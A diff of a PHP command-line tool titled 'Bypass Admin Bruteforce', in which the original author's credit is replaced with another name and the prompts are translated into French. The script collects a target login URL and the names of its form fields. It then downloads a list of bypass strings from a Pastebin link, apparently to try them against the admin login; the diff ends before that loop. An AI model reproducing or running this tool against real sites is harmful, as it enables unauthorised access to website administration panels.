@@ -1,32 +1,25 @@
 <?php
 $banner = "\e[36;1m                                                                                 
-                                                                                 
-           #         ######   
-           #    #             
-  ######   #    #  ########## 
-           #    #  #        # 
-           #######        ##  
-##########      #       ##    
-                #     ##      
-                              
-                                                                                 
+____ ____ _  _ ___ ____ _  _ ____ _  _ ____ 
+|    |  | |\ |  |  |  | |  | |__/ |\ | |___ 
+|___ |__| | \|  |  |__| |__| |  \ | \| |___ 
+                                                                                              
 [#] Bypass Admin Bruteforce [#]    
                                    
-Coded by : Revan AR                  
-Team   : IndoSec                   
-Github : https//github.com/revan-ar/\n\n\e[0;1m";
+Coder par  : Faxel                 
+/\n\n\e[0;1m";
 echo $banner;
 sleep(2);
-echo ">>> URL POST : ";
+echo ">>> URL DE PUBLICATION : ";
 $url = trim(fgets(STDIN));
 sleep(2);
-echo ">>> FORM USER NAME : ";
+echo ">>> NOM D'UTILISATEUR DU FORMULAIRE : ";
 $username = trim(fgets(STDIN));
 sleep(2);
-echo ">>> FORM PASSWORD NAME : ";
+echo ">>> FORMULER LE NOM DU MOT DE PASSE : ";
 $password = trim(fgets(STDIN));
 sleep(2);
-echo ">>> BUTTON SUBMIT NAME : ";
+echo ">>> NOM DU BOUTON ENVOYER  : ";
 $submit = trim(fgets(STDIN));
 $list = file_get_contents("https://pastebin.com/Quvi8Gsz");
 $contourne = explode("\r\n", $list);
